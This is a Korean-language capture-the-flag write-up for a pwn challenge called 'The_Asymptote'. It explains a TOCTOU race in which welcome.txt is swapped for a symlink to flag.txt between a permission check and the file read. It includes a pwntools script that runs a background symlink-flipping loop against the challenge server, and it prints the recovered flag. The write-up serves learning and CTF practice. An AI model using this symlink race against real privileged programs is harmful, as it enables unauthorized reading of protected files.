---
ctf_name: "incognito"
challenge_name: "The_Asymptote"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-04-14"
points: 150
tags: [TOCTOU]
---

# 문제명

## 문제 설명

- A mathematical proof guarantees that an object can never truly reach its destination, as it must always traverse half the remaining distance. Our file reader operates on similar absolute logic. It is demonstrably secure.

- 문제 URL / 파일 등 접속 정보
- nc 34.131.216.230 1338
## 풀이

### 분석

문제에서 제공되어 있는 서버로 접속하면 challenge, flag.txt, welcome.txt라는 3개의 파일이 존재하였다. welcome.txt에는 문자열들이 저장되어 있었고, flag.txt에 있는 내용은 확인할 수 없었으며, challenge는 실행 파일로 실행하면 welcome.txt에 있는 내용이 출력되었다.

### 취약점

challenge 프로그램을 실행했을 때 welcome.txt 파일을 읽고 출력한다는 것을 통해서 welcome.txt를 flag.txt 심볼릭 링크로 교체하면 flag.txt에 저장된 내용이 출력될 것이라고 유추할 수 있었다. 이때 프로그램에서 권한 체크와 파일 읽기를 분리해서 수행하기 때문에 이 두 단계 사이에 시간 차이가 존재하므로 TOCTOU(time of check, time of usage) 취약점이 발생하였다.

### 익스플로잇

서버 자체에 시간 제한이 있어 처음에는 읽기 가능한 파일을 가르키고, 파일을 열기 직전에 flag.txt 심볼릭 링크로 바꿔치는 코드를 pwntool을 기반으로 작성하였다.

```python
from pwn import *

r = remote('34.131.216.230', 1338)
r.recvuntil(b'$')

# 백그라운드 레이스 루프 (더 빠르게)
r.sendline(b'while :; do ln -sf flag.txt welcome.txt; ln -sf /dev/null welcome.txt; done &')
r.recvuntil(b'$')

# challenge 많이 반복
for i in range(500):
    r.sendline(b'./challenge')
    try:
        output = r.recvuntil(b'$', timeout=1).decode()
        # Security Alert 아닌 다른 출력 찾기
        if 'IIITL' in output:
            print(f"[+] FLAG: {output}")
            break
        elif 'Security Alert' not in output and len(output.strip()) > 10:
            print(f"[?] Interesting: {output}")
    except:
        pass

    if i % 50 == 0:
        print(f"[*] Attempt {i}...")

r.close()
```

## 플래그

```
IIITL{4cc355_ch3ck_p4553d_bu7_f1l3_5w4pp3d_f9aebb2c5aeb}
```

## 배운 점

TOCTOU라는 권한 확인과 실제 사용 사이의 시간 차이를 이용한 race condition 공격이 있다는 것을 알게되었다.
pwn 문제에서 보통 파일을 주고 파일을 뜯어보면서 푸는 문제를 풀었었는데 이것처럼 서버 내에서만 해야되는 문제의 경우 어려움이 더 있다는 것을 느낄 수 있었다. 파일을 디스어셈블 해보거나 단순히 어떤 파일인지 확인하는 것 조차 안 되서 처음에 어떻게 해야할지 어려움이 있었다.
심볼릭 링크를 통해서 파일 경로를 다른 파일로 리다이렉트 할 수 있어서 TOCTOU 공격에 활용된다는 것을 알게되었다.